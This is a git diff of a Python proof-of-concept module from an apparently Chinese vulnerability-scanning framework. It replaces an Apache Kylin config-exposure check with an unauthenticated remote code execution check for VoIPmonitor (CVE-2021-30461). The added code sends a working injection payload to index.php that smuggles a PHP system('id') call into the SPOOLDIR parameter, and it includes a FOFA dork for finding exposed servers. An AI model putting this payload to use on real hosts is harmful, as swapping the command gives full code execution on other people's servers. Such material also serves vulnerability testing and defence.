@@ -14,24 +14,21 @@ class POC(POCBase):
         "CreateDate" : "2021-06-09",        # POC创建时间
         "UpdateDate" : "2021-06-09",        # POC创建时间
         "PocDesc" : """
-        略  
+            略  
         """,                                # POC描述，写更新描述，没有就不写
 
-        "name" : "Apache Kylin 未授权配置泄露(CVE-2020-13937)",                        # 漏洞名称
-        "VulnID" : "CVE-2020-13937",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
-        "AppName" : "Apache Kylin",                     # 漏洞应用名称
-        "AppVersion" : """
-            Apahche Kylin 2.x.x
-            Apahche Kylin <= 3.1.0
-            Apahche Kylin 4.0.0-alpha
-        """,                  # 漏洞应用版本
+        "name" : "VoIPmonitor 未授权远程代码执行(CVE-2021-30461)",                        # 漏洞名称
+        "VulnID" : "CVE-2021-30461",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
+        "AppName" : "VoIPmonitor",                     # 漏洞应用名称
+        "AppVersion" : "VoIPmonitor < 24.60",                  # 漏洞应用版本
         "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
         "VulnDesc" : """
-            Apache Kylin有一个restful api会在没有任何认证的情况下暴露配置信息。
+            VoIPmonitor 是开源网络数据包嗅探器，具有商业前端，用于在 linux 上运行的 SIP RTP RTCP SKINNY(SCCP) MGCP WebRTC VoIP 协议。
+            VoIPmonitor的index.php文件中接受未授权用户提交的未经验证的参数值并将之写进了配置文件中，该配置文件在index.php代码下文中被require_once函数包含，从而导致任意代码执行
         """,                                # 漏洞简要描述
 
         "fofa-dork":"""
-            app="APACHE-kylin"
+            title="VoIPmonitor"
         """,                     # fofa搜索语句
         "example" : "",                     # 存在漏洞的演示url，写一个就可以了
         "exp_img" : "",                      # 先不管  
@@ -46,20 +43,22 @@ class POC(POCBase):
         不存在漏洞：vuln = [False,""]
         """
         vuln = [False,""]
-        url = self.target + "/kylin/api/admin/config" # url自己按需调整
-        
+        url = self.target + "/index.php" # url自己按需调整
+
+        data = """SPOOLDIR=test".system("id")."&recheck=annen"""
 
         headers = {"User-Agent":get_random_ua(),
                     "Connection":"close",
-                    # "Content-Type": "application/x-www-form-urlencoded",
+                    "Content-Type": "application/x-www-form-urlencoded",
                     }
         
         try:
             """
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
-            req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if '{"config":"' in req.text:#req.status_code == 200 and :
+            req = requests.post(url,data=data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
+
+            if "uid=" in req.text:
                 vuln = [True,req.text]
             else:
                 vuln = [False,req.text]
